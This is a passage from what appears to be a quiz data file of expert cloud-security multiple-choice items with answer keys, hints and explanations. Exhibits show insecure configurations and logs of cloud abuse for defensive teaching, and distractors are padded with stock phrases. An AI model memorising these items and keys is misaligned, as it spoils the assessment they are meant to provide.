  },
  {
    id: 1155, rank: 3, role: "cloud-security", topic: "Private Connectivity Choice", difficulty: "EXPERT",
    q: "How can a workload reach a cloud storage service without crossing the public internet?",
    options: ["Through a public IP address, and a firewall rule, in most cases","Through a private endpoint inside the virtual network","Through a proxy that sits on a developer laptop, as a general rule","Through a shared password sent over email, in most cases"],
    correct: 1, why: "Private endpoints keep traffic on the provider's private network.",
    hint: "Private endpoint."
  },
  {
    id: 1156, rank: 3, role: "cloud-security", topic: "Pipeline Federation", difficulty: "EXPERT",
    q: "How should a pipeline in an external system get cloud access without stored keys?",
    options: ["Store a long-lived key in a pipeline variable","Share a user password with the pipeline team, where that is practical","Federate its identity, and issue short-lived tokens","Create one admin account for every pipeline job, wherever possible"],
    correct: 2, why: "Federation removes long-lived secrets.",
    hint: "Short-lived tokens."
  },
  {
    id: 1157, rank: 3, role: "cloud-security", topic: "Network Policy Exhibit", difficulty: "EXPERT",
    exhibit: "kind: NetworkPolicy\nmetadata: name=payments-ingress namespace=payments\nspec:\n  podSelector: {}\n  policyTypes: [Ingress]\n  ingress:\n  - from: [{podSelector: {matchLabels: {tier: web}}}]",
    q: "What is the effect of this Kubernetes network policy?",
    options: ["All pods in the cluster accept traffic from anywhere, as a general rule","Pods in other namespaces may reach the payments pods freely","The web tier cannot send any traffic at all","Pods in the payments namespace accept traffic only from the web tier"],
    correct: 3, why: "Ingress rules limit allowed sources to the labelled web tier.",
    hint: "Ingress from podSelector."
  },
  {
    id: 1158, rank: 3, role: "cloud-security", topic: "Multi-Region Resilience", difficulty: "EXPERT",
    q: "A critical service must survive the loss of a whole region. What is the BEST approach?",
    options: ["Daily backups kept in the same region as production","A runbook that nobody has tried in an exercise","Active replication to a second region with tested failover, in most cases","A bigger instance in the primary region only"],
    correct: 2, why: "Same-region backups are the runner-up as they protect data, but they do not survive a regional outage.",
    hint: "Region loss."
  },
  {
    id: 1159, rank: 3, role: "cloud-security", topic: "Secrets Rotation Design", difficulty: "EXPERT",
    q: "Which design lets database passwords rotate without application downtime?",
    options: ["A password stored in a config file for each release, as a general rule","A shared spreadsheet that the team updates by hand, as a general rule","A password that is never changed to avoid breakage","A secrets service that rotates, and apps that fetch current values"],
    correct: 3, why: "Dynamic retrieval lets rotation happen without code changes.",
    hint: "Fetch current value."
  },
  {
    id: 1160, rank: 3, role: "cloud-security", topic: "Guardrail Exhibit", difficulty: "EXPERT",
    exhibit: "{\"Effect\":\"Deny\",\"Action\":[\"cloudtrail:StopLogging\",\"cloudtrail:DeleteTrail\",\"cloudtrail:UpdateTrail\"],\"Resource\":\"*\"}",
    q: "What does this guardrail prevent in member accounts?",
    options: ["Turning off or changing the organisation audit trail, and revisit the decision after the next release","Reading the audit trail from the security account","Creating new storage buckets for any team","Using any compute service in approved regions"],
    correct: 0, why: "The deny blocks disabling or altering central logging.",
    hint: "Deny on trail actions."
  },
  {
    id: 1161, rank: 3, role: "cloud-security", topic: "Ephemeral Environments", difficulty: "EXPERT",
    q: "Why are short-lived test environments created from code safer than long-lived hand-built ones?",
    options: ["They are always cheaper than production","They allow developers to skip peer review","They never need any security controls at all as they only exist for a short time","They are consistent, and removed before drift builds up"],
    correct: 3, why: "Disposable, repeatable environments reduce drift and forgotten exposure.",
    hint: "Disposable."
  },
  {
    id: 1162, rank: 3, role: "cloud-security", topic: "Shared Services Account", difficulty: "EXPERT",
    q: "Which account should hold the central security tooling and logs?",
    options: ["A dedicated security account with restricted access","Any account that has a spare budget available","The sandbox account used by new developers, as a general rule","The production account that runs customer workloads, in most cases"],
    correct: 0, why: "Separate accounts protect evidence from workload administrators.",
    hint: "Separation of duties."
  },
  {
    id: 1163, rank: 3, role: "cloud-security", topic: "Enclave Protection", difficulty: "EXPERT",
    q: "What does confidential computing add for sensitive workloads?",
    options: ["Free storage for archived logs","Protection of data in use inside a hardware enclave, as a general rule","Faster network speeds between regions for workloads that move large datasets daily","Automatic removal of every old user"],
    correct: 1, why: "It protects data while it is being processed.",
    hint: "Data in use."
  },
  {
    id: 1164, rank: 3, role: "cloud-security", topic: "Edge Protection Design", difficulty: "EXPERT",
    q: "A public API faces large volumetric attacks. What is the BEST layered defence?",
    options: ["A longer DNS record lifetime for the endpoint","Blocking every address from outside the country","A content network with DDoS protection and WAF rules, as a general rule","Larger servers behind a single public address"],
    correct: 2, why: "Larger servers are the runner-up as they add capacity, but they cannot absorb attacks at internet scale.",
    hint: "Absorb at the edge."
  },
  {
    id: 1165, rank: 3, role: "cloud-security", topic: "Log Pipeline Exhibit", difficulty: "EXPERT",
    exhibit: "log_destination: s3://app-prod-logs (account 111122223333, same as workload)\nretention_days: 365\nversioning: off\nobject_lock: off\nwriters: app-admin-role, ci-role",
    q: "What is wrong with this logging configuration?",
    options: ["Logs are encrypted with a customer-managed key, and kept for the required period of time","Logs are retained for the required period","Logs sit in the same account that attackers could control","Logs are sent to an immutable bucket"],
    correct: 2, why: "Evidence stored where an intruder has admin rights can be deleted or altered.",
    hint: "Where do logs live?"
  },
  {
    id: 1166, rank: 3, role: "cloud-security", topic: "Tenant Isolation", difficulty: "EXPERT",
    q: "Which design best isolates customers in a multi-tenant cloud application?",
    options: ["Trusting the client to send only its own records","A tenant name typed in each page header","Per-tenant identity, and data scoping enforced by policy, as a general rule","One shared database user for every tenant"],
    correct: 2, why: "Isolation must be enforced on the server side.",
    hint: "Enforce server side."
  },
  {
    id: 1167, rank: 3, role: "cloud-security", topic: "Zero Trust Access", difficulty: "EXPERT",
    q: "Which principle best describes zero trust access to cloud admin consoles?",
    options: ["Trust anyone who is inside the office network","Allow any user who knows the console address, as a general rule","Grant standing admin rights to all engineers, and revisit the decision after the next release","Verify each request using identity and device posture"],
    correct: 3, why: "Zero trust assesses every request rather than the network location.",
    hint: "Never trust by location."
  },
  {
    id: 1168, rank: 3, role: "cloud-security", topic: "Infrastructure Code Review", difficulty: "EXPERT",
    q: "What should a security review of infrastructure code check before deployment?",
    options: ["Policies and templates scanned for insecure settings","Only the cost estimate of each resource, as a general rule","Only the colour scheme of the dashboards, as a general rule","Only the names of the files in the repository, as a general rule"],
    correct: 0, why: "Pre-deployment scans catch misconfigurations early.",
    hint: "Shift left."
  },
  {
    id: 1169, rank: 3, role: "cloud-security", topic: "Image Supply Chain", difficulty: "EXPERT",
    q: "What is the BEST way for a platform team to ensure only trusted container images run in production?",
    options: ["Any image from public registries pulled by tag, in most cases","Signed images from a private registry with admission checks","Images pulled once, and trusted forever","Images built on laptops, and copied to servers, in most cases"],
    correct: 1, why: "Pulling from public registries is the runner-up as it is convenient, but it gives no assurance about image origin or content.",
    hint: "Signed and verified."
  },
  {
    id: 1170, rank: 3, role: "cloud-security", topic: "Cloud Incident Exhibit", difficulty: "EXPERT",
    exhibit: "RunInstances x 412  user=ci-deploy  src=203.0.113.77\nRegions: ap-southeast-2 (118) sa-east-1 (141) eu-north-1 (153)\nInstance type: p4d.24xlarge\nDaily cost: 2,100 -> 61,400 USD",
    q: "What is the most likely cause of this spike in cost and activity?",
    options: ["A change to the colour of the console","Stolen keys used to start many instances in unused regions, as a general rule","A normal increase from the scheduled backup that finance approved at the start of the year","A reduced number of users logging in"],
    correct: 1, why: "Mining or abuse often appears as instances in regions the company never uses.",
    hint: "Unused regions."
  },
  {
    id: 1171, rank: 3, role: "cloud-security", topic: "Data Residency Design", difficulty: "EXPERT",
    q: "A legal rule requires customer data to stay in one country. Which control best enforces this?",
    options: ["Trusting developers to remember it, and revisit the decision after the next release","A reminder at the weekly meeting","A note in the onboarding document","Region restrictions in organisation policy and replication rules"],
    correct: 3, why: "Technical guardrails enforce the rule automatically.",
    hint: "Technical guardrails."
  },
  {
    id: 1172, rank: 3, role: "cloud-security", topic: "Break Glass Design", difficulty: "EXPERT",
    q: "What is a sound design for emergency administrator access?",
    options: ["No emergency access at all","One shared admin password written on a wiki page, as a general rule","Permanent admin rights for the entire team, as a general rule","Sealed accounts with strong MFA, and alerts on any use"],
    correct: 3, why: "Emergency access should be rare and fully alerted.",
    hint: "Alert on use."
  },
  {
    id: 1173, rank: 3, role: "cloud-security", topic: "Serverless Permission Exhibit", difficulty: "EXPERT",
    exhibit: "Function: order-processor\nRole policy: {\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}\nTriggers: public API gateway route /orders",
    q: "What is the main problem in this function role?",
    options: ["It allows writing to one log stream","It allows reading one queue only","It grants all actions on all resources","It limits access to a single table"],
    correct: 2, why: "A wildcard role gives an attacker full reach if the function is compromised.",
    hint: "Look at the Action."
  },
  {
    id: 1174, rank: 3, role: "cloud-security", topic: "Network Segmentation Exhibit", difficulty: "EXPERT",
    exhibit: "rt-dev:\n10.1.0.0/16  local\n10.2.0.0/16  pcx-dev-prod  (prod databases)\n0.0.0.0/0    igw-1\nNo network ACL restricts 10.2.0.0/16",
    q: "What risk does this route table create?",
    options: ["The logging network is isolated from every host","The development network can reach production databases directly","The backup network is missing","The production network cannot reach the internet"],
    correct: 1, why: "Open routes between environments remove separation.",
    hint: "Dev to prod route."
  },
  {
    id: 1175, rank: 3, role: "cloud-security", topic: "Cloud Governance Metrics", difficulty: "EXPERT",
    q: "Which metric best shows that cloud guardrails are working?",
    options: ["The number of dashboards that exist","The number of meetings the team has held","The size of the security budget alone","The share of accounts that meet baseline controls over time, as a general rule"],
    correct: 3, why: "Compliance coverage over time shows outcomes.",
    hint: "Outcome metric."
  },
  {
    id: 1176, rank: 3, role: "cloud-security", topic: "Vendor Lock-In Trade-Off", difficulty: "EXPERT",
    q: "Which trade-off should an architect weigh when using provider-specific security services?",
    options: ["Higher cost with no integration at all, as a general rule","Lower security with easier migration, in most cases","Deeper integration against harder migration later","No trade-off exists at all"],
    correct: 2, why: "Native services integrate well but raise switching costs.",
    hint: "Integration versus portability."
  },
  {
    id: 1177, rank: 3, role: "cloud-security", topic: "Quarantine Pattern", difficulty: "EXPERT",
    q: "A storage bucket receives untrusted uploads. What is the BEST pattern before the files reach users?",
    options: ["Scan in an isolated quarantine bucket then release clean files","Serve uploads directly to all users at once","Trust the file type given by the uploader","Rename the files with a safe extension only"],
    correct: 0, why: "Serving directly is the runner-up as it is fast, but infected or malicious files would reach users unscanned.",
    hint: "Scan first."
  },
  {
    id: 1178, rank: 3, role: "cloud-security", topic: "Envelope Key Hierarchy", difficulty: "EXPERT",
    q: "Why use a key hierarchy with a master key and data keys?",
    options: ["It limits exposure and allows efficient rotation","It removes the need for any access policy","It stores keys in plain text","It makes every key the same size"],
    correct: 0, why: "Envelope encryption protects data keys with a master key.",
    hint: "Envelope encryption."
  },
  {
    id: 1179, rank: 3, role: "cloud-security", topic: "API Gateway Exhibit", difficulty: "EXPERT",
    exhibit: "GET /customers/{id}   authorizer=NONE   rate_limit=none\nPOST /orders          authorizer=JWT    rate_limit=100/min\nGET /health           authorizer=NONE   rate_limit=10/s",
    q: "What does this gateway configuration leave open?",
    options: ["A route protected by token validation, as a general rule","A route that requires mutual TLS","An unauthenticated route that returns customer records","A route with strict rate limits"],
    correct: 2, why: "A route with no authorizer exposes data to anyone.",
    hint: "Authorizer: NONE."
  },
  {
    id: 1180, rank: 3, role: "cloud-security", topic: "Cross-Cloud Identity", difficulty: "EXPERT",
    q: "Which approach best gives one consistent identity across several cloud providers?",
    options: ["A central identity provider federated to each cloud","Anonymous access to every console","Separate local users in each provider","A shared password for all providers"],
    correct: 0, why: "Central federation gives one place for lifecycle and MFA.",
    hint: "Federate."
  },
  {
    id: 1181, rank: 3, role: "cloud-security", topic: "Recovery Architecture", difficulty: "EXPERT",
    q: "Which design best protects backups from ransomware that has admin rights?",
    options: ["Backups on the same server as production, as a general rule","Backups editable by all administrators","Immutable copies in a separate locked account","Backups that are never tested"],
    correct: 2, why: "Immutability and separation stop attackers deleting recovery data.",
    hint: "Immutable and separate."
  },
  {
    id: 1182, rank: 3, role: "cloud-security", topic: "Policy as Code", difficulty: "EXPERT",
    q: "What is the main benefit of policy as code for cloud governance?",
    options: ["Policies that only apply after an incident, as a general rule","Manual approvals for every small change","Policies written in a slide deck","Consistent automated checks that are versioned and reviewed"],
    correct: 3, why: "Code makes rules testable and repeatable.",
    hint: "Automate rules."
  },
  {
    id: 1183, rank: 3, role: "cloud-security", topic: "Detective Control Exhibit", difficulty: "EXPERT",
    exhibit: "Finding: UnauthorizedAccess:IAMUser/MaliciousIPCaller.Custom\nPrincipal: svc-reporting\nAction: ListBuckets, GetObject x 3,900\nSource: 192.0.2.150 (listed in threat feed)",
    q: "What does this finding most likely indicate?",
    options: ["An administrator reading documentation, in most cases","A normal deployment by the pipeline, as a general rule","Unusual API calls from a known malicious address","A scheduled security scan"],
    correct: 2, why: "Threat intelligence matches suggest hostile activity.",
    hint: "Threat list match."
  },
  {
    id: 1184, rank: 3, role: "cloud-security", topic: "Container Runtime Security", difficulty: "EXPERT",
    q: "Which control best limits damage if a container is compromised?",
    options: ["Opening every port for debugging, where that is practical","Mounting the host disk into the container","Running with full host privileges","Running as non-root with a read-only filesystem"],
    correct: 3, why: "Least privilege at runtime reduces escape and tamper options.",
    hint: "Non-root, read-only."
  },
  {
    id: 1185, rank: 3, role: "cloud-security", topic: "Security Review Triage", difficulty: "EXPERT",
    q: "A new design has three open risks. What is the BEST way to decide which to fix before launch?",
    options: ["Fix the one that is easiest to close","Rank by impact and likelihood and fix the highest first","Defer all three until the first incident, as a general rule","Fix the one the vendor mentioned first, as a general rule"],
    correct: 1, why: "Fixing the easiest is the runner-up as it shows progress, but it may leave the largest risk open.",
    hint: "Risk-based order."
  },
  {
    id: 1186, rank: 3, role: "cloud-security", topic: "Shared Image Pipeline Exhibit", difficulty: "EXPERT",
    exhibit: "FROM python:latest\nRUN pip install -r requirements.txt\nUSER root\n# no signature check, no digest pin",
    q: "What is the weakness in this image build pipeline?",
    options: ["The base image uses a floating tag without verification","The image is scanned before release and signed after the build in an isolated worker","The build runs in an isolated worker","The image is signed after the build"],
    correct: 0, why: "Floating tags can change silently and introduce unreviewed content.",
    hint: "Tag is :latest."
  },
  {
    id: 1187, rank: 3, role: "cloud-security", topic: "Cloud Exit Planning", difficulty: "EXPERT",
    q: "Why should a cloud design include an exit and data return plan?",
    options: ["To keep keys in the provider forever","To retrieve and delete data safely if the contract ends, in most cases","To avoid ever using backups as the provider already keeps a copy of every file safe","To stop all monitoring"],
    correct: 1, why: "Exit planning protects data and continuity.",
    hint: "Plan the exit."
  },
  {
    id: 1188, rank: 3, role: "cloud-security", topic: "Logging Cost Balance", difficulty: "EXPERT",
    q: "Which approach best balances logging cost and detection value?",
    options: ["Keep critical logs hot and archive the rest at lower cost","Log everything forever at the highest tier, as a first step","Disable all logs to save money, until the next scheduled review takes place","Keep only the logs from yesterday"],
    correct: 0, why: "Tiering retains evidence while controlling cost.",
    hint: "Tiering."
  },
  {
    id: 1189, rank: 3, role: "cloud-security", topic: "Segmentation of Admin Plane", difficulty: "EXPERT",
    q: "Why separate the management plane from the data plane in cloud design?",
    options: ["A compromised workload should not control the cloud account","It makes applications run faster","It removes the need for logging","It lets everyone share admin credentials"],
    correct: 0, why: "Separation limits how far a workload compromise spreads.",
    hint: "Limit blast radius."
  },
  {
    id: 1190, rank: 3, role: "cloud-security", topic: "Service Mesh Trust", difficulty: "EXPERT",
    q: "What does mutual TLS in a service mesh provide between services?",
    options: ["Removal of all authorisation rules","Each side proves its identity and the traffic is encrypted","Only faster response times","A public view of internal traffic"],
    correct: 1, why: "mTLS gives authentication and confidentiality between workloads.",
    hint: "Both sides authenticate."
  },
  {
    id: 1191, rank: 3, role: "cloud-security", topic: "Landing Zone Guardrail Exhibit", difficulty: "EXPERT",
    exhibit: "Deny * when aws:RequestedRegion not in [eu-west-1, eu-central-1]\nApplies to: OU=Workloads (42 accounts)\nExceptions: global services",
    q: "What is the effect of this guardrail?",
    options: ["Users can create resources anywhere in the world that they would like to use","Resources cannot be created outside approved regions","Only administrators can sign in to the accounts that the policy is applied to","All logging is disabled for the accounts that are inside the workloads unit"],
    correct: 1, why: "Region restriction supports residency and risk control.",
    hint: "Regions."
  },
  {
    id: 1192, rank: 3, role: "cloud-security", topic: "Egress Control Architecture", difficulty: "EXPERT",
    q: "Which design best controls outbound traffic from workloads?",
    options: ["Disable outbound logging, and the volume of data in the log platform is smaller","Allow all outbound traffic from every subnet and nothing is ever blocked by mistake","Route through an inspecting proxy or firewall with allow lists, in most cases","Give each instance a public address and it can reach the internet directly always"],
    correct: 2, why: "Egress control limits data exfiltration and command channels.",
    hint: "Control egress."
  },
  {
    id: 1193, rank: 3, role: "cloud-security", topic: "Disaster Recovery Across Accounts", difficulty: "EXPERT",
    q: "How can a backup account improve ransomware resilience?",
    options: ["By deleting old backups quickly, and there is less data for anyone to steal","By making each backup bigger, and it takes longer for an attacker to copy it","By isolating backups from production administrators, in most cases","By making backups public and the owners can find them from anywhere easily"],
    correct: 2, why: "Isolation limits the reach of compromised credentials.",
    hint: "Separate admins."
  },
  {
    id: 1194, rank: 3, role: "cloud-security", topic: "Policy as Code Pipeline", difficulty: "EXPERT",
    q: "Where should infrastructure policy checks run?",
    options: ["Nowhere, as the cloud provider already checks all policies on behalf of customers","Only after an incident has happened, and the investigation team has written its report","Only in the production console by an administrator who has time during the week","In the pipeline before deployment, and continuously after, as a general rule"],
    correct: 3, why: "Shift-left plus runtime checks cover drift.",
    hint: "Before and after."
  },
  {
    id: 1195, rank: 3, role: "cloud-security", topic: "Confidential Workload Design", difficulty: "EXPERT",
    q: "Which approach protects sensitive data processed in the cloud from provider operators?",
    options: ["Customer-managed keys, and confidential computing, as a general rule","Longer passwords for each administrator who works in the account on the project","Public links that expire after a day and need no sign-in for the person who gets it","Disabling logs, and provider staff cannot see what the application has been doing"],
    correct: 0, why: "Hardware isolation and customer keys reduce provider access.",
    hint: "Customer control."
  },
  {
    id: 1196, rank: 3, role: "cloud-security", topic: "Network Architecture Exhibit", difficulty: "EXPERT",
    exhibit: "Account A: prod-web, prod-db, dev-web, dev-db, test-db\nVPC: single 10.0.0.0/16 for all\nSecurity groups: shared 'default-all'\nIAM: developers have admin in Account A",
    q: "What is the main weakness in this architecture summary?",
    options: ["Production and development share the same account, and network, in most cases","Production is isolated in its own account","Development has no access to production data","Logging is centralised"],
    correct: 0, why: "Shared environments increase blast radius.",
    hint: "Separate environments."
  },
  {
    id: 1197, rank: 3, role: "cloud-security", topic: "Service Account Governance", difficulty: "EXPERT",
    q: "What is a good governance control for service accounts?",
    options: ["Owners expiry review and scoped permissions","No logging of the actions that the accounts take, and the logs stay small","Unlimited lifetime for each account, and no one has to review them again later","Shared passwords that every engineer on the team knows, and keeps in their notes"],
    correct: 0, why: "Service accounts need lifecycle management.",
    hint: "Owner and review."
  },
  {
    id: 1198, rank: 3, role: "cloud-security", topic: "Cloud Exit Strategy", difficulty: "EXPERT",
    q: "Why include portability considerations in cloud security design?",
    options: ["To avoid contracts with any supplier, and the company can change at any time","To reduce risk of being locked into one supplier","To reduce the number of backups that the company must keep for the audit year","To eliminate security controls that slow down the migration to another supplier"],
    correct: 1, why: "Exit planning supports resilience and negotiation.",
    hint: "Avoid lock-in."
  },
  {
    id: 1199, rank: 3, role: "cloud-security", topic: "Evidence for Cloud Audits", difficulty: "EXPERT",
    q: "How can teams provide continuous evidence of cloud compliance?",
    options: ["Verbal statements from the control owners that are given at the closing meeting","Automated configuration checks with stored results","Emails that say the controls have been working as intended over the past year","Screenshots taken once a year by an engineer a few days before the auditors arrive"],
    correct: 1, why: "Automated checks are timely and verifiable.",
    hint: "Automated."
  },
  {
    id: 1200, rank: 3, role: "cloud-security", topic: "Data Platform Guardrails", difficulty: "EXPERT",
    q: "Which guardrail best protects sensitive data in a shared analytics platform?",
    options: ["One shared administrator account for all analysts, as a general rule","Removing logging to speed up queries, and revisit the decision after the next release","Copying the data into spreadsheets for all teams","Column-level masking with role-based access and audit logs"],
    correct: 3, why: "Fine-grained controls protect sensitive fields.",
    hint: "Mask and audit."
  },
  {
    id: 1201, rank: 4, role: "cloud-security", topic: "Multi-Cloud Control Plane", difficulty: "EXPERT",
    q: "An enterprise runs three cloud providers and wants consistent security posture. What is the BEST strategy?",
    options: ["Common baseline controls expressed as code and enforced per provider","Quarterly spreadsheets that compare settings between providers, in most cases","One provider's native tool applied to all three by hand, as a general rule","Separate teams that each choose their own controls, and tools"],
    correct: 0, why: "Separate team choices are the runner-up as they fit each platform, but they give no common baseline and no reliable view of risk.",
    hint: "Baseline as code."
  },
  {
    id: 1202, rank: 4, role: "cloud-security", topic: "Compromised Pipeline Role", difficulty: "EXPERT",
    exhibit: "02:14 AssumeRole  role=deploy-pipeline  src=198.51.100.23\n02:15 CreateUser   name=svc-backup2\n02:15 AttachUserPolicy  AdministratorAccess\n02:16 CreateAccessKey  user=svc-backup2\n02:18 ConsoleLogin user=svc-backup2 src=198.51.100.23",
    q: "What does this sequence of events indicate?",
    options: ["A pipeline role was abused to create persistence in another account","A developer testing a new dashboard during working hours, as a general rule","A normal release that finished successfully last night, as a general rule","A scheduled rotation of access keys by the platform team, in most cases"],
    correct: 0, why: "Creating users and keys after a pipeline assumes a role is a persistence pattern.",
    hint: "Who created the new user?"
  },
  {
    id: 1203, rank: 4, role: "cloud-security", topic: "Blast Radius Calculation", difficulty: "EXPERT",
    q: "Which design change most reduces blast radius for a shared cloud platform?",
    options: ["Per-team accounts with scoped roles, and organisation guardrails","Shared access keys that rotate once a year by hand, in most cases","One large account with a single administrator group","A central team that holds every permission for everyone"],
    correct: 0, why: "Account-level isolation limits what any one compromise can reach.",
    hint: "Isolation boundary."
  },
  {
    id: 1204, rank: 4, role: "cloud-security", topic: "Evidence Preservation Cloud", difficulty: "EXPERT",
    q: "During a cloud investigation which step is BEST done first to protect volatile evidence?",
    options: ["Wipe the volume and rebuild it from the latest image, and revisit the decision after the next release","Reboot the host to clear any running malware","Isolate the host and capture memory and disk snapshots","Terminate the instance and the attacker is removed"],
    correct: 2, why: "Terminating is the runner-up as it stops the attacker, but it destroys memory and the running state that investigators need.",
    hint: "Evidence order."
  },
  {
    id: 1205, rank: 4, role: "cloud-security", topic: "Key Compromise Response", difficulty: "EXPERT",
    q: "A signing key may have been exposed. Which response is most complete?",
    options: ["Rename the key, and attackers cannot find it again","Wait to see whether anyone abuses it in the next month","Revoke and replace the key then review all uses of it","Reduce the logging level, and fewer alerts appear"],
    correct: 2, why: "Revocation, replacement and a usage review contain and scope the exposure.",
    hint: "Revoke and review."
  },
  {
    id: 1206, rank: 4, role: "cloud-security", topic: "Cross-Account Trust Exhibit", difficulty: "EXPERT",
    exhibit: "\"Principal\":{\"AWS\":\"arn:aws:iam::444455556666:root\"}\n\"Action\":\"sts:AssumeRole\"\n\"Condition\":{}",
    q: "What is the weakness in this role trust policy?",
    options: ["It expires the session after fifteen minutes","It requires MFA for every session that assumes it","It trusts any principal from the partner account without conditions","It limits trust to one named role with an external ID"],
    correct: 2, why: "Whole-account trust without conditions lets any identity there assume the role.",
    hint: "Look at the Principal."
  },
  {
    id: 1207, rank: 4, role: "cloud-security", topic: "Detection Engineering Tuning", difficulty: "EXPERT",
    q: "A cloud detection fires 400 times a day with almost no real incidents. What is the BEST improvement?",
    options: ["Tune it with context such as asset criticality, and known automation","Raise its severity, and analysts review every alert","Disable the rule and the queue is easier to manage","Send every alert directly to the head of security, and revisit the decision after the next release"],
    correct: 0, why: "Disabling is the runner-up as it removes noise, but it also removes coverage for the behaviour the rule was written to catch.",
    hint: "Tune, do not delete."
  },
  {
    id: 1208, rank: 4, role: "cloud-security", topic: "Resilience Test Exhibit", difficulty: "EXPERT",
    exhibit: "Service: payments-db\nTarget RTO: 60 min   Target RPO: 5 min\nTest: restore in secondary region\nActual RTO: 4 h 20 min   Actual RPO: 38 min\nBlocker: encryption key not replicated",
    q: "What does this recovery test result show?",
    options: ["Recovery finished well inside the agreed target, as a general rule","Recovery missed its target and the process needs improvement","The network was never connected to the primary site","Backups were never created for the database"],
    correct: 1, why: "The measured recovery time is longer than the objective.",
    hint: "Compare RTO and actual."
  },
  {
    id: 1209, rank: 4, role: "cloud-security", topic: "Quantifying Cloud Risk", difficulty: "EXPERT",
    q: "Which approach best expresses cloud risk to executives?",
    options: ["Business impact and likelihood tied to critical services","The number of rules in the firewall","The name of the provider region","A list of every raw finding from the scanner, as a general rule"],
    correct: 0, why: "Executives need risk in terms of business outcomes.",
    hint: "Business terms."
  },
  {
    id: 1210, rank: 4, role: "cloud-security", topic: "Delegated Administration", difficulty: "EXPERT",
    q: "Which design best delegates admin duties while keeping control of the organisation?",
    options: ["One shared root user for the whole company","No delegation and every change through one person, in most cases","Full organisation owner rights for every team lead, in most cases","Permission boundaries, and guardrails around delegated admins"],
    correct: 3, why: "Boundaries let teams work without exceeding limits.",
    hint: "Boundaries."
  },
  {
    id: 1211, rank: 4, role: "cloud-security", topic: "Third-Party Access Exhibit", difficulty: "EXPERT",
    exhibit: "Vendor: AcmeSupport\nRole: AdministratorAccess  (no expiry)\nTrust: arn:aws:iam::777788889999:root (no external ID)\nLogging of vendor sessions: disabled",
    q: "What risk does this vendor access setup create?",
    options: ["A scoped role that requires approval each time","A role limited to one resource, and region","Standing admin access with no expiry or monitoring, wherever possible","A read-only role that expires after a day"],
    correct: 2, why: "Broad permanent vendor access is a common route for supply chain compromise.",
    hint: "Permanent admin."
  },
  {
    id: 1212, rank: 4, role: "cloud-security", topic: "Data Classification Controls", difficulty: "EXPERT",
    q: "How should controls differ for restricted and public data in the cloud?",
    options: ["Public data receives the strongest controls only, in most cases","Both receive identical settings regardless of value, as a general rule","Restricted data may be shared by public link","Restricted data gets stronger encryption and tighter access"],
    correct: 3, why: "Controls should scale with data sensitivity.",
    hint: "Match sensitivity."
  },
  {
    id: 1213, rank: 4, role: "cloud-security", topic: "Customer Key Revocation", difficulty: "EXPERT",
    q: "What happens to data protected by a customer key if that key is deleted without a backup?",
    options: ["The data becomes public for thirty days","The data is automatically decrypted for admins","The data cannot be decrypted by anyone","The data moves to a different region"],
    correct: 2, why: "Without the key the ciphertext is unrecoverable.",
    hint: "No key, no data."
  },
  {
    id: 1214, rank: 4, role: "cloud-security", topic: "Architecture Review Exhibit", difficulty: "EXPERT",
    exhibit: "Public subnet: ALB, bastion, db-primary (public IP 52.x.x.x)\nPrivate subnet: app-servers\nSecurity group db: 5432 from 0.0.0.0/0\nLogs: central security account",
    q: "Which flaw in this design is most serious?",
    options: ["The logs are shipped to a separate account","The app tier sits in a private subnet","The load balancer terminates TLS in the public subnet, as a general rule","The database sits in a public subnet with a public address"],
    correct: 3, why: "A public database is directly reachable from the internet.",
    hint: "Where is the database?"
  },
  {
    id: 1215, rank: 4, role: "cloud-security", topic: "Insider Threat in Cloud", difficulty: "EXPERT",
    q: "A departing administrator still has active cloud access. What is the BEST action?",
    options: ["Reduce their permissions slowly over several months, as soon as practical","Ask them to delete their own credentials, and revisit the decision after the next release","Disable their access immediately and review their recent activity","Wait until their notice period finishes to avoid friction"],
    correct: 2, why: "Waiting is the runner-up as it avoids friction, but it leaves privileged access open during the highest-risk window.",
    hint: "Act at departure."
  },
  {
    id: 1216, rank: 4, role: "cloud-security", topic: "Federated Session Risk", difficulty: "EXPERT",
    q: "Which control best reduces the risk of stolen federated sessions?",
    options: ["Short token lifetimes and conditional access checks","Sharing sessions between team members, as a general rule","Disabling logging for federated users, wherever possible","Very long tokens that never expire"],
    correct: 0, why: "Short lifetimes and checks limit stolen token use.",
    hint: "Short tokens."
  },
  {
    id: 1217, rank: 4, role: "cloud-security", topic: "Cloud Forensics Readiness", difficulty: "EXPERT",
    q: "Which preparation best helps a future cloud investigation?",
    options: ["No logging to reduce the storage bill, as a general rule","Logs kept only on each server for one week, as a general rule","Central immutable logs with agreed retention and access","Logs shared with every developer"],
    correct: 2, why: "Evidence must exist and be trustworthy when needed.",
    hint: "Prepare evidence."
  },
  {
    id: 1218, rank: 4, role: "cloud-security", topic: "Egress Exfiltration Exhibit", difficulty: "EXPERT",
    exhibit: "src=10.4.8.17 (hr-db-replica)\ndst=203.0.113.200:443 (not in allow list)\nbytes_out=41.8 GB over 52 min\nnormal daily egress for this host: 0.2 GB",
    q: "What does this network summary suggest?",
    options: ["A server sending unusually large data to an unknown external address","A normal software update download","A health check from the load balancer","A scheduled backup to the approved region"],
    correct: 0, why: "Large outbound transfers to unknown hosts suggest exfiltration.",
    hint: "Outbound volume."
  },
  {
    id: 1219, rank: 4, role: "cloud-security", topic: "Compliance Mapping", difficulty: "EXPERT",
    q: "How should an architect map cloud controls to several regulations?",
    options: ["Define common controls and map each to the regulations","Ignore regulations until an audit begins, as a general rule","Copy controls from another company unchanged","Write a separate control set for each regulation, in the first instance"],
    correct: 0, why: "Common controls reduce duplicated work and gaps.",
    hint: "Common control set."
  },
  {
    id: 1220, rank: 4, role: "cloud-security", topic: "Risk Acceptance Process", difficulty: "EXPERT",
    q: "What should a formal risk acceptance for a cloud exception include?",
    options: ["An open-ended exception with no review","Named owner, expiry date, compensating controls and approval, in most cases","A verbal agreement with no record","A decision made by the engineer alone"],
    correct: 1, why: "Accepted risk needs ownership and a review date.",
    hint: "Owner and expiry."
  },
  {
    id: 1221, rank: 4, role: "cloud-security", topic: "Ransomware in Cloud Storage", difficulty: "EXPERT",
    q: "Mass object deletion is detected in a cloud bucket. What is the BEST first containment action?",
    options: ["Ask users whether they deleted the files","Suspend the identity and enable object lock or versioning recovery, in most cases","Wait for the deletions to finish before acting, and review the outcome at the next monthly meeting","Delete the bucket and nothing else is lost"],
    correct: 1, why: "Deleting the bucket is the runner-up as it stops further loss, but it destroys the remaining data and the evidence.",
    hint: "Stop the actor."
  },
  {
    id: 1222, rank: 4, role: "cloud-security", topic: "Platform Security Roadmap", difficulty: "EXPERT",
